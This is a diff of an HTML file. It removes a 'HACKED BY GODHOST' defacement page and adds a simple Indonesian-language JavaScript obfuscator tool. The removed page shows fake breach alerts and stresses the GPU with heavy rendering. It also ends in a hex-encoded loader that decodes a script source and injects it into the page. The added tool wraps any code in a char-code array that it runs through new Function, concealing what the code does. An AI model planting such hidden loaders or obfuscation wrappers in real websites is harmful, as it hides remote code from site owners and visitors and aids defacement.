@@ -1,206 +1,93 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>GODHOST  v2</title>
+<title>PRO MAX JS OBFUSCATOR</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
-html,body{width:100%;height:100%;overflow:hidden;background:#000;font-family:'Share Tech Mono',monospace;color:#0f0;cursor:crosshair}
-
-/* FRACTAL CANVAS */
-#main{position:fixed;top:0;left:0;transform-origin:0 0;z-index:0}
-#c1{width:2048px;height:2048px;background:#000}
-
-/* THREE.JS CANVAS */
-#three-canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none}
-
-/* OVERLAYS */
-.scanlines{position:fixed;top:0;left:0;width:100%;height:200%;z-index:10;pointer-events:none;
-background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,0,0.03) 2px,rgba(0,255,0,0.03) 4px);
-animation:scanmove 8s linear infinite}
-@keyframes scanmove{0%{transform:translateY(0)}100%{transform:translateY(-50%)}}
-
-.vignette{position:fixed;top:0;left:0;width:100%;height:100%;z-index:11;pointer-events:none;
-background:radial-gradient(ellipse at center,transparent 40%,rgba(0,0,0,0.85) 100%)}
-
-.grid-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:2;pointer-events:none;opacity:0.04;
-background-image:linear-gradient(#0f0 1px,transparent 1px),linear-gradient(90deg,#0f0 1px,transparent 1px);
-background-size:50px 50px}
-
-#matrix{position:fixed;top:0;left:0;z-index:3;opacity:0.12;pointer-events:none}
-
-/* HUD */
-.hud{position:fixed;z-index:20;pointer-events:none}
-
-.top-bar{top:0;left:0;width:100%;padding:8px 16px;display:flex;justify-content:space-between;align-items:center;
-background:linear-gradient(180deg,rgba(0,20,0,0.95) 0%,transparent 100%);border-bottom:1px solid rgba(0,255,0,0.3)}
-.top-bar .brand{font-family:'Orbitron',monospace;font-size:14px;font-weight:900;color:#0f0;
-text-shadow:0 0 10px #0f0,0 0 20px #0f0,0 0 40px #0f0;animation:pulse-glow 2s infinite}
-.top-bar .status{color:#f00;font-size:12px;animation:blink 0.5s infinite}
-
-.bottom-bar{bottom:0;left:0;width:100%;height:32px;background:rgba(255,0,0,0.1);border-top:2px solid #f00;
-display:flex;align-items:center;overflow:hidden}
-.ticker{white-space:nowrap;color:#f00;font-size:13px;font-weight:bold;animation:scroll 20s linear infinite;
-text-shadow:0 0 10px #f00,0 0 20px #f00}
-@keyframes scroll{0%{transform:translateX(100vw)}100%{transform:translateX(-200%)}}
-
-.panel{background:rgba(0,10,0,0.88);border:1px solid rgba(0,255,0,0.4);padding:10px 14px;font-size:11px;line-height:1.8;
-backdrop-filter:blur(4px)}
-.panel-tl{top:44px;left:12px;min-width:220px}
-.panel-tr{top:44px;right:12px;min-width:200px;text-align:right}
-.panel-bl{bottom:44px;left:12px;min-width:240px}
-.panel-br{bottom:44px;right:12px;min-width:200px;text-align:right}
-.panel .label{color:#0f08;font-size:10px;text-transform:uppercase;letter-spacing:2px}
-.panel .val{color:#0f0;font-family:'Orbitron',monospace;font-size:13px}
-.panel .val.red{color:#f00;text-shadow:0 0 8px #f00}
-.panel .val.cyan{color:#0ff;text-shadow:0 0 8px #0ff}
-.panel .bar{height:4px;background:#0f03;margin-top:2px;border-radius:2px;overflow:hidden}
-.panel .bar-fill{height:100%;background:linear-gradient(90deg,#0f0,#ff0,#f00);transition:width 0.3s}
-
-.center-text{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:20;text-align:center;pointer-events:none}
-.center-text h1{font-family:'Orbitron',monospace;font-size:clamp(24px,5vw,56px);font-weight:900;color:#f00;
-text-shadow:0 0 20px #f00,0 0 40px #f00,0 0 80px #f00,0 0 120px rgba(255,0,0,0.5);
-animation:glitch 3s infinite,red-pulse 2s infinite;letter-spacing:4px}
-.center-text h2{font-family:'Orbitron',monospace;font-size:clamp(11px,2vw,20px);color:#0f0;margin-top:8px;
-text-shadow:0 0 10px #0f0,0 0 30px #0f0;animation:pulse-glow 1.5s infinite;letter-spacing:8px}
-.center-text .sub{font-size:clamp(9px,1.5vw,14px);color:#0ff;margin-top:12px;text-shadow:0 0 10px #0ff;animation:blink 1s infinite}
-
-/* CONFIG PANEL */
-#config{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:100;
-background:rgba(0,5,0,0.95);border:2px solid #0f0;padding:20px;width:90%;max-width:500px;pointer-events:all;
-box-shadow:0 0 40px rgba(0,255,0,0.3)}
-#config textarea{width:100%;height:200px;background:#000;color:#0f0;border:1px solid #0f03;font-family:'Share Tech Mono',monospace;
-font-size:11px;padding:8px;resize:vertical}
-#config button{background:#0f02;color:#0f0;border:1px solid #0f0;padding:6px 16px;margin:8px 4px 0;cursor:pointer;
-font-family:'Share Tech Mono',monospace;font-size:12px;transition:all 0.2s}
-#config button:hover{background:#0f0;color:#000}
-
-.ctrl-btn{position:fixed;top:44px;left:50%;transform:translateX(-50%);z-index:30;pointer-events:all;
-background:rgba(0,255,0,0.1);color:#0f0;border:1px solid #0f0;padding:4px 14px;font-family:'Orbitron',monospace;
-font-size:10px;cursor:pointer;letter-spacing:2px;transition:all 0.2s}
-.ctrl-btn:hover{background:#0f0;color:#000}
-
-/* WARNINGS */
-.warn-box{position:fixed;border:1px solid rgba(255,0,0,0.6);background:rgba(255,0,0,0.08);z-index:15;pointer-events:none;
-padding:6px 12px;font-size:10px;color:#f00;animation:float-warn 4s ease-in-out infinite alternate}
-.w1{top:22%;right:15px;animation-delay:0s}.w2{top:55%;left:15px;animation-delay:1s}
-.w3{top:38%;right:25%;animation-delay:2s}.w4{bottom:28%;left:20%;animation-delay:0.5s}
-.w5{top:15%;left:30%;animation-delay:1.5s}.w6{bottom:20%;right:15%;animation-delay:0.8s}
-
-@keyframes float-warn{0%{transform:translateY(0);opacity:0.5}100%{transform:translateY(-15px);opacity:1}}
-@keyframes glitch{
-0%,100%{transform:translate(-50%,-50%)}
-2%{transform:translate(-54%,-50%);filter:hue-rotate(90deg)}
-4%{transform:translate(-48%,-52%);filter:hue-rotate(0)}
-6%{transform:translate(-50%,-50%)}
-42%{transform:translate(-50%,-50%)}
-44%{transform:translate(-52%,-48%);filter:hue-rotate(180deg)}
-46%{transform:translate(-50%,-50%);filter:hue-rotate(0)}}
-@keyframes pulse-glow{0%,100%{text-shadow:0 0 10px #0f0,0 0 20px #0f0}50%{text-shadow:0 0 20px #0f0,0 0 40px #0f0,0 0 80px #0f0}}
-@keyframes red-pulse{0%,100%{opacity:1}50%{opacity:0.85}}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
-
-@media(max-width:600px){
-.panel{font-size:9px;padding:6px 8px;min-width:130px!important}
-.panel .val{font-size:10px}
-.top-bar .brand{font-size:10px}
-}
+  body {
+    background: #0a0a0a;
+    color: #00ff99;
+    font-family: Arial;
+    padding: 20px;
+  }
+  textarea {
+    width: 100%;
+    height: 180px;
+    background: #111;
+    color: #00ff99;
+    border: 1px solid #333;
+    padding: 10px;
+  }
+  button {
+    margin-top: 10px;
+    padding: 10px;
+    background: #00ff99;
+    border: none;
+    cursor: pointer;
+    font-weight: bold;
+  }
+  pre {
+    margin-top: 15px;
+    background: #000;
+    padding: 10px;
+    white-space: pre-wrap;
+    border: 1px solid #333;
+  }
 </style>
 </head>
 <body>
 
-<div id="main"><canvas id="c1" width="2048" height="2048"></canvas></div>
-<canvas id="three-canvas"></canvas>
-<canvas id="matrix"></canvas>
-<div class="scanlines"></div>
-<div class="vignette"></div>
-<div class="grid-overlay"></div>
+<h2>🔥 PRO MAX JavaScript Obfuscator</h2>
 
-<!-- HUD -->
-<div class="hud top-bar">
-  <span class="brand">⚡ GODHOST SYSTEMS ⚡</span>
-  <span class="status">⬤ BREACHED</span>
-</div>
+<textarea id="input" placeholder="Masukkan JS kamu..."></textarea>
+<br>
+<button onclick="obfuscate()">OBFUSCATE PRO MAX</button>
 
-<button class="ctrl-btn" id="btn">CONTROLS</button>
-
-<div id="config">
-  <div style="color:#0f08;font-size:10px;letter-spacing:2px;margin-bottom:8px">// SHADER KERNEL EDITOR</div>
-  <textarea id="kernel"></textarea>
-  <div>
-    <button id="apply">APPLY</button>
-    <button id="cancle">CANCEL</button>
-  </div>
-</div>
-
-<div class="hud panel panel-tl">
-  <div class="label">// GPU STATUS</div>
-  <div>LOAD: <span class="val red" id="gpuLoad">98%</span></div>
-  <div class="bar"><div class="bar-fill" id="gpuBar" style="width:98%"></div></div>
-  <div>TEMP: <span class="val red" id="gpuTemp">87°C</span></div>
-  <div>VRAM: <span class="val cyan" id="vram">7.2/8.0 GB</span></div>
-  <div>CLOCK: <span class="val" id="gpuClock">2145 MHz</span></div>
-  <div>FRACTAL ITER: <span class="val red">25×4000</span></div>
-</div>
-
-<div class="hud panel panel-tr">
-  <div class="label">// NETWORK</div>
-  <div>TARGET: <span class="val red">192.168.1.██</span></div>
-  <div>PACKETS: <span class="val" id="packets">0</span></div>
-  <div>PROTOCOL: <span class="val cyan">TCP/UDP</span></div>
-  <div>LATENCY: <span class="val" id="latency">12ms</span></div>
-  <div>STATUS: <span class="val red">INJECTING</span></div>
-</div>
-
-<div class="hud panel panel-bl">
-  <div class="label">// SYSTEM BREACH LOG</div>
-  <div id="logArea" style="max-height:100px;overflow:hidden;font-size:10px;color:#0f0a;line-height:1.6"></div>
-</div>
-
-<div class="hud panel panel-br">
-  <div class="label">// RENDER STATS</div>
-  <div>FPS: <span class="val" id="fps">60</span></div>
-  <div>TRIANGLES: <span class="val cyan" id="tris">0</span></div>
-  <div>DRAW CALLS: <span class="val" id="draws">0</span></div>
-  <div>3D OBJECTS: <span class="val" id="objs">0</span></div>
-  <div>VIEWPORTS: <span class="val red">4×4 GRID</span></div>
-</div>
-
-<div class="center-text">
-  <h1>HACKED BY GODHOST</h1>
-  <h2>◈ SYSTEM BREACHED ◈</h2>
-  <div class="sub"> STRESS  — MANDELBULB + THREE.JS — ALL CORES ENGAGED</div>
-</div>
-
-<div class="warn-box w1">⚠ FIREWALL BYPASSED</div>
-<div class="warn-box w2">⚠ ROOT ACCESS GRANTED</div>
-<div class="warn-box w3">⚠ ENCRYPTION BROKEN</div>
-<div class="warn-box w4">⚠ DATA EXFILTRATION</div>
-<div class="warn-box w5">⚠ KERNEL COMPROMISED</div>
-<div class="warn-box w6">⚠ GPU HIJACKED</div>
-
-<div class="hud bottom-bar">
-  <div class="ticker">
-    ██ GODHOST ██ SYSTEM BREACHED ██ GPU STRESS ACTIVE ██ ALL DEFENSES DOWN ██ 
-    MANDELBULB FRACTAL RENDERING ██ SHADER INJECTION COMPLETE ██ MEMORY OVERFLOW ██ KERNEL PANIC ██ 
-    HACKED BY GODHOST ❤ ██ TOTAL SYSTEM COMPROMISE ██ 
-    GPU TEMP CRITICAL ██ VRAM SATURATED ██ RENDER PIPELINE HIJACKED ██ 4×4 VIEWPORT GRID ACTIVE ██
-  </div>
-</div>
-<audio id="bgm" src="audio.mp3" autoplay loop muted></audio>
+<pre id="output"></pre>
 
 <script>
-const audio = document.getElementById("bgm");
+function rand() {
+  return "_0x" + Math.random().toString(16).slice(2,10);
+}
 
-document.addEventListener("click", function () {
-    audio.muted = false;
-    audio.play();
-}, { once: true });
+// ubah string ke hex array
+function encode(str) {
+  return str.split("").map(c => c.charCodeAt(0));
+}
+
+function obfuscate() {
+  let code = document.getElementById("input").value;
+
+  if (!code.trim()) {
+    document.getElementById("output").innerText = "Isi dulu kodenya!";
+    return;
+  }
+
+  let arrName = rand();
+  let fnName = rand();
+  let idx = rand();
+
+  let encoded = encode(code);
+
+  let result = `
+(function(){
+  var ${arrName} = [${encoded.join(",")}];
+
+  var ${fnName} = function(a){
+    var r = "";
+    for(var ${idx}=0; ${idx}<a.length; ${idx}++){
+      r += String.fromCharCode(a[${idx}]);
+    }
+    return r;
+  };
+
+  new Function(${fnName}(${arrName}))();
+})();
+  `.trim();
+
+  document.getElementById("output").innerText = result;
+}
 </script>
-<!-- THREE.JS -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-<script>(function(){const a="5a32396b6147397a64412e5a32396b6147397a6441";let b=a.match(/../g).map(c=>String.fromCharCode(parseInt(c,16))).join('');let d=document.createElement('script');d.src=b;document.head.appendChild(d);})();</script>
+
 </body>
 </html>
